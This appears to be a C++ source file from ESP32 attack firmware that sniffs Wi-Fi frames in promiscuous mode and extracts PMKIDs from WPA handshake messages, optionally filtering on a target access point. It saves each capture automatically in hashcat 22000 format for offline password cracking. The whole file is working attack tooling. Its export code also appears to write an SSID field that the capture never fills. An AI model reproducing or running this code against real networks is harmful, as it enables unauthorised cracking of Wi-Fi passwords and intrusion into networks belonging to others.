/**
 * @file pmkid_capture.cpp
 * @brief Implementação de Captura PMKID
 * 
 * @author Monster S3 Team
 * @date 2025-12-23
 */

#include "pmkid_capture.h"
#include "module_manager.h"
#include "core/aggressive_sd.h"
#include <WiFi.h>
#include <esp_wifi.h>

// Static member initialization
bool PMKIDCapture::_capturing = false;
uint8_t PMKIDCapture::_targetBSSID[6] = {0};
bool PMKIDCapture::_hasTarget = false;
PMKIDResult PMKIDCapture::_captures[50];
int PMKIDCapture::_captureCount = 0;

// EAPOL constants
#define EAPOL_TYPE_KEY 0x03
#define EAPOL_KEY_INFO_INSTALL 0x0040
#define EAPOL_KEY_INFO_ACK 0x0080

// RSN PMKID attribute
#define RSN_PMKID_TYPE 0x04
#define RSN_PMKID_LEN  16

// ============================================================================
// CALLBACK PROMÍSCUO
// ============================================================================

void PMKIDCapture::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!_capturing) return;
    if (type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* data = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 50) return;  // Too short for EAPOL
    
    // Check for EAPOL frame (802.1X)
    // Frame Control should indicate data frame
    uint8_t frameType = (data[0] & 0x0C) >> 2;
    if (frameType != 2) return;  // Not data frame
    
    // Look for LLC/SNAP header with EAP type (0x888E)
    const uint8_t* llc = nullptr;
    int headerLen = 24;  // Minimum 802.11 header
    
    // Check for QoS
    if (data[0] & 0x80) {
        headerLen += 2;
    }
    
    if (len < headerLen + 8) return;
    
    // Find LLC/SNAP
    llc = &data[headerLen];
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    if (llc[6] != 0x88 || llc[7] != 0x8E) return;  // Not 802.1X
    
    // Parse EAPOL
    const uint8_t* eapol = llc + 8;
    int eapolLen = len - headerLen - 8;
    
    PMKIDResult result;
    if (parseEAPOL(eapol, eapolLen, &result)) {
        // Copy MAC addresses from frame
        memcpy(result.bssid, &data[10], 6);      // BSSID
        memcpy(result.clientMac, &data[4], 6);   // Source
        
        // Check target filter
        if (_hasTarget) {
            if (memcmp(result.bssid, _targetBSSID, 6) != 0) {
                return;  // Not our target
            }
        }
        
        // Check for duplicate
        bool duplicate = false;
        for (int i = 0; i < _captureCount; i++) {
            if (memcmp(_captures[i].pmkid, result.pmkid, 16) == 0) {
                duplicate = true;
                break;
            }
        }
        
        if (!duplicate && _captureCount < 50) {
            result.valid = true;
            _captures[_captureCount++] = result;
            
            // Log capture
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    result.bssid[0], result.bssid[1], result.bssid[2],
                    result.bssid[3], result.bssid[4], result.bssid[5]);
            
            Serial.printf("[PMKID] Captured from %s\n", macStr);
            
            // Auto-save
            exportHashcat("/pmkid_captures.22000");
        }
    }
}

bool PMKIDCapture::parseEAPOL(const uint8_t* data, size_t len, PMKIDResult* result) {
    if (len < 99) return false;  // Minimum EAPOL-Key with PMKID
    
    // EAPOL header
    uint8_t version = data[0];
    uint8_t type = data[1];
    uint16_t bodyLen = (data[2] << 8) | data[3];
    
    if (type != EAPOL_TYPE_KEY) return false;  // Not key frame
    
    // Key descriptor
    const uint8_t* keyData = &data[4];
    
    // Key Info (2 bytes)
    uint16_t keyInfo = (keyData[1] << 8) | keyData[2];
    
    // Check for Message 1 (ACK set, Install not set)
    if (!(keyInfo & EAPOL_KEY_INFO_ACK)) return false;
    if (keyInfo & EAPOL_KEY_INFO_INSTALL) return false;
    
    // Key Data Length (at offset 97-98 in key descriptor)
    uint16_t keyDataLen = (keyData[95] << 8) | keyData[96];
    
    if (keyDataLen < 22) return false;  // Too short for PMKID
    
    // PMKID is in Key Data as RSN IE
    const uint8_t* keyDataField = &keyData[97];
    
    return extractPMKID(keyDataField, keyDataLen, result->pmkid);
}

bool PMKIDCapture::extractPMKID(const uint8_t* data, size_t len, uint8_t* pmkid) {
    // Parse RSN KDE
    size_t offset = 0;
    
    while (offset + 4 < len) {
        uint8_t type = data[offset];
        uint8_t kdeLen = data[offset + 1];
        
        if (offset + 2 + kdeLen > len) break;
        
        // Check for PMKID KDE (OUI 00-0F-AC, type 4)
        if (kdeLen >= 20) {
            if (data[offset + 2] == 0x00 &&
                data[offset + 3] == 0x0F &&
                data[offset + 4] == 0xAC &&
                data[offset + 5] == RSN_PMKID_TYPE) {
                
                // Found PMKID
                memcpy(pmkid, &data[offset + 6], RSN_PMKID_LEN);
                return true;
            }
        }
        
        offset += 2 + kdeLen;
    }
    
    return false;
}

// ============================================================================
// CONTROLE
// ============================================================================

void PMKIDCapture::start(const uint8_t* targetBSSID) {
    Serial.println("[PMKID] Starting capture...");
    
    ModuleManager::ativaModulo(MODULE_WIFI);
    
    if (targetBSSID) {
        memcpy(_targetBSSID, targetBSSID, 6);
        _hasTarget = true;
        Serial.printf("[PMKID] Target: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     _targetBSSID[0], _targetBSSID[1], _targetBSSID[2],
                     _targetBSSID[3], _targetBSSID[4], _targetBSSID[5]);
    } else {
        _hasTarget = false;
        Serial.println("[PMKID] Capturing all");
    }
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    
    _capturing = true;
    _captureCount = 0;
}

void PMKIDCapture::stop() {
    _capturing = false;
    esp_wifi_set_promiscuous(false);
    Serial.printf("[PMKID] Stopped. Captured %d PMKIDs\n", _captureCount);
}

bool PMKIDCapture::isCapturing() {
    return _capturing;
}

int PMKIDCapture::getCaptureCount() {
    return _captureCount;
}

PMKIDResult PMKIDCapture::getCapture(int index) {
    if (index >= 0 && index < _captureCount) {
        return _captures[index];
    }
    
    PMKIDResult empty = {0};
    empty.valid = false;
    return empty;
}

// ============================================================================
// EXPORT
// ============================================================================

bool PMKIDCapture::exportHashcat(const char* filename) {
    if (_captureCount == 0) return false;
    
    String content = "";
    
    for (int i = 0; i < _captureCount; i++) {
        PMKIDResult& cap = _captures[i];
        
        // Hashcat 22000 format:
        // WPA*02*PMKID*MAC_AP*MAC_CLIENT*ESSID_HEX***
        
        content += "WPA*02*";
        
        // PMKID
        for (int j = 0; j < 16; j++) {
            char hex[3];
            snprintf(hex, sizeof(hex), "%02x", cap.pmkid[j]);
            content += hex;
        }
        content += "*";
        
        // MAC AP
        for (int j = 0; j < 6; j++) {
            char hex[3];
            snprintf(hex, sizeof(hex), "%02x", cap.bssid[j]);
            content += hex;
        }
        content += "*";
        
        // MAC Client
        for (int j = 0; j < 6; j++) {
            char hex[3];
            snprintf(hex, sizeof(hex), "%02x", cap.clientMac[j]);
            content += hex;
        }
        content += "*";
        
        // ESSID (hex encoded)
        for (int j = 0; j < strlen(cap.ssid); j++) {
            char hex[3];
            snprintf(hex, sizeof(hex), "%02x", cap.ssid[j]);
            content += hex;
        }
        
        content += "***\n";
    }
    
    return AggressiveSD::writeFile(filename, content.c_str());
}

void PMKIDCapture::clear() {
    _captureCount = 0;
    Serial.println("[PMKID] Captures cleared");
}
